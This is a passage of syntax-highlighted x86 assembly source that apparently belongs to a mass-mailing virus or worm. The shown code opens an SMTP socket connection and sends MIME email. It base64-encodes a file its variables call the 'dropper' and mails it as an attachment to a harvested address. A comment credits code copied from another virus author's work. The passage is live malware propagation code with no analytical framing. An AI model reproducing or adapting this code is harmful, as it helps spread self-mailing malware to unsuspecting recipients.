        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sockaddr_in.sin_addr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sinsize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sockaddr_in</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">conn_socket</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">connect</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">foutdusdis</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mailh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstrings</span><span class="sc0">                     </span><span class="sc1">;send ONE email</span><span class="sc0">

</span><span class="sc5">foutdusdis</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">disconnect</span><span class="sc0">


</span><span class="sc5">doei</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">disconnect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">conn_socket</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">closesocket</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WSACleanup</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;esi = string</span><span class="sc0">
</span><span class="sc1">;return, esi is end of string</span><span class="sc0">
</span><span class="sc5">sendstring</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">search0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">search0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                          </span><span class="sc1">;edi is 1 too high due scasb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                      </span><span class="sc1">;edi=end,esi=start, end-start=len</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">conn_socket</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">200</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Sleep</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;esi = start string</span><span class="sc0">
</span><span class="sc1">;if string is asciiz, next string will be sended</span><span class="sc0">
</span><span class="sc1">;if an 0ffh is after the sz, the function stops</span><span class="sc0">
</span><span class="sc1">;if an 001h is after the sz, the function first sends the mime boundrary</span><span class="sc0">
</span><span class="sc5">sendstrings</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstring</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">sendstrings</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exitsendstrings</span><span class="sc0">
                                          
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">createandsendbase64</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">senddestmailaddy</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exitsendstrings</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mnxtprt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstring</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sendstrings</span><span class="sc0">
        
</span><span class="sc5">exitsendstrings</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">createandsendbase64</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        
</span><span class="sc1">;        lea     esi,ebp+testpath</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropperfh</span><span class="sc0">        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">openfile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">foutdusdis</span><span class="sc0">      </span><span class="sc1">;erhm...</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropperfh.file</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">BASE64encode</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sendstrings</span><span class="sc0">

</span><span class="sc5">senddestmailaddy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">addybuffer</span><span class="sc0">   </span><span class="sc1">;got filled up at start with some addy</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstring</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sendstrings</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;opens file at ESI and fills up the structure at edi.</span><span class="sc0">
</span><span class="sc1">;and returns the mapview in ESI</span><span class="sc0">
</span><span class="sc5">openfile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                               
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">erroropening</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">;max size low</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">erroropening</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;BASE64 encoding routine - ctrl+c &amp; ctrl+v from GriYo's Parvo</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;                               esi -&gt; Input smtpbuffer</span><span class="sc0">
</span><span class="sc1">;                               eax -&gt; Size of input smtpbuffer (Min. 03h)</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">BASE64encode</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TranslateTbl</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Beatsmtpbuffer</span><span class="sc4">]</span><span class="sc0">       
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BeatCounter</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;The rest</span><span class="sc0">
</span><span class="sc5">BASE64loop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">               </span><span class="sc1">;Take 03h bytes</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64Block1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64Block2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64Block3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64Block4</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">BASE64loop</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;Get the rest</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">no_rest</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">rest_is_1</span><span class="sc0">

</span><span class="sc5">rest_is_2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64Block1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64Block2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64Block3</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rest_is_done</span><span class="sc0">

</span><span class="sc5">rest_is_1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64Block1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64Block2</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">rest_is_done</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'='</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_rest</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A0Ah</span><span class="sc0">        </span><span class="sc1">;New-line and null terminator</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Beatsmtpbuffer</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc6">pushad</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sendstring</span><span class="sc0">
                                </span><span class="sc6">popad</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">BASE64Block1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">got_6bits</span><span class="sc0">

</span><span class="sc5">BASE64Block2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">got_6bits</span><span class="sc0">

</span><span class="sc5">BASE64Block3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">got_6bits</span><span class="sc0">

</span><span class="sc5">BASE64Block4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">got_6bits</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
                </span><span class="sc6">xlatb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BeatCounter</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BeatCounter</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000004Ch</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">put_new_line</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000004Ch</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">put_new_line</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000004Ch</span><span class="sc4">*</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">put_new_line</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000004Ch</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">put_new_line</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000004Ch</span><span class="sc4">*</span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">put_new_line</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000004Ch</span><span class="sc4">*</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">put_new_line</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000004Ch</span><span class="sc4">*</span><span class="sc2">07h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">put_new_line</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000004Ch</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">BeatNotReady</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000Ah</span><span class="sc0">        </span><span class="sc1">;New-line and null terminator</span><span class="sc0">
